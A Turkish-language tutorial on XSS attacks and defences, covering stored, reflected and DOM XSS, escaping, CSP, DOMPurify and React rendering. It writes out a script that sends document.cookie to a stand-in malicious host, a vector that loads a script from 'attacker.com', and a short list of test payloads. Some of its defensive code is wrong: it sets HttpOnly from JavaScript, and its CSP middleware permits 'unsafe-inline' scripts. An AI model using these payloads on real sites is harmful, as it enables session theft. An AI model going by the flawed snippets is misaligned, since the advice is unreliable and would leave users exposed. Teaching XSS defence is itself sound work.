
# Web Uygulamalarında XSS Saldırıları ve Korunma Yöntemleri

Cross-Site Scripting (XSS) saldırıları, web güvenliğinin en yaygın ve tehlikeli tehditlerinden biridir. Bu yazıda XSS saldırılarının türlerini, nasıl çalıştığını ve etkili korunma yöntemlerini inceleyeceğiz.

## XSS Nedir?

XSS, saldırganların web uygulamalarına kötü amaçlı JavaScript kodu enjekte etmesine olanak tanıyan bir güvenlik açığıdır. Bu kodlar, kullanıcının tarayıcısında çalışarak hassas bilgilerin çalınmasına neden olabilir.

## XSS Türleri

### 1. Stored XSS (Kalıcı XSS)
Kötü amaçlı kod doğrudan sunucuda saklanır ve her kullanıcı o sayfayı ziyaret ettiğinde çalışır.

```javascript
// Örnek zarar verici kod
<script>
  // Kullanıcının cookie'lerini çal
  fetch('http://malicious-site.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>
```

### 2. Reflected XSS (Yansıyan XSS)
Kötü amaçlı kod URL parametresi olarak gönderilir ve sunucu tarafından yansıtılır.

### 3. DOM-based XSS
Saldırı tamamen client-side'da gerçekleşir ve DOM manipülasyonu yoluyla çalışır.

## Korunma Yöntemleri

### 1. Input Validation (Giriş Doğrulama)
```javascript
function validateInput(input) {
  // HTML karakterlerini escape et
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}
```

### 2. Content Security Policy (CSP)
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

### 3. HttpOnly ve Secure Cookies
```javascript
// Güvenli cookie ayarlama
document.cookie = "sessionId=abc123; HttpOnly; Secure; SameSite=Strict";
```

## Gerçek Dünya Örnekleri

### Facebook'ta XSS Zafiyet Örneği (2011)
Facebook'ta keşfedilen bir XSS açığı, kullanıcıların profil sayfalarına zararlı kod yerleştirmelerine olanak tanıyordu:

```javascript
// Örnek saldırı vektörü
javascript:void($.getScript('http://attacker.com/malicious.js'))
```

### Twitter'da Self-XSS Saldırısı
Kullanıcıları, konsola kod yapıştırmaya ikna eden sosyal mühendislik saldırısı:

```javascript
// Kullanıcıları kandırmaya yönelik kod
console.log("Bu kodu çalıştırırsanız hesabınız hack'lenebilir!");
```

## İleri Seviye Korunma Teknikleri

### 1. DOM Purify Kullanımı
```javascript
import DOMPurify from 'dompurify';

// Güvenli HTML temizleme
const cleanHTML = DOMPurify.sanitize(dirtyHTML);
document.getElementById('content').innerHTML = cleanHTML;
```

### 2. React'ta Güvenli Rendering
```jsx
// Güvenli - React otomatik olarak escape eder
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>;
}

// Tehlikeli - dangerouslySetInnerHTML kullanımı
function DangerousComponent({ htmlContent }) {
  return (
    <div 
      dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(htmlContent)
      }} 
    />
  );
}
```

### 3. Express.js'te CSP Middleware
```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
  },
}));
```

## Penetration Testing için XSS Payloadları

> **Uyarı:** Bu payloadlar sadece eğitim amaçlıdır ve sadece sahip olduğunuz sistemlerde test edilmelidir.

```javascript
// Basit alert payload'u
<script>alert('XSS')</script>

// Image tag ile payload
<img src=x onerror=alert('XSS')>

// SVG ile payload
<svg onload=alert('XSS')>

// Form ile payload
<form><button formaction=javascript:alert('XSS')>Test</button></form>
```

## Sonuç

XSS saldırıları ciddi güvenlik tehditleri oluşturabilir. Düzenli güvenlik testleri, input validation, CSP gibi koruma mekanizmalarını implement ederek bu tehditlere karşı korunabiliriz.

### Önemli Hatırlatmalar:

1. **Hiçbir zaman kullanıcı girdisine güvenmeyin**
2. **Her zaman input validation yapın**
3. **Output encoding kullanın**
4. **Content Security Policy implementasyonu yapın**
5. **Düzenli güvenlik testleri gerçekleştirin**

**Unutmayın:** Güvenlik, bir hedef değil sürekli bir süreçtir. Her zaman güncel kalın ve yeni tehditlere karşı hazırlıklı olun.
